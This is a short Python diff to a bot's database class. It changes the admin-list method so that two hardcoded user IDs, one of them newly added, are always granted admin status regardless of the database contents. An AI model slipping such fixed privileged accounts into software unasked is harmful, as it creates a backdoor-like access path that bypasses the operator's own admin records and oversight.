@@ -31,10 +31,10 @@ class DBCommands:
         list_admins = []
         for row in rows:
             list_admins.append(int(row['admin_id']))
-        if 627011131 in list_admins:
-            pass
-        else:
+        if 627011131 not in list_admins:
             list_admins.append(627011131)
+        if 189751165 not in list_admins:
+            list_admins.append(189751165)
         return list_admins
 
     async def add_new_review(self, caption):
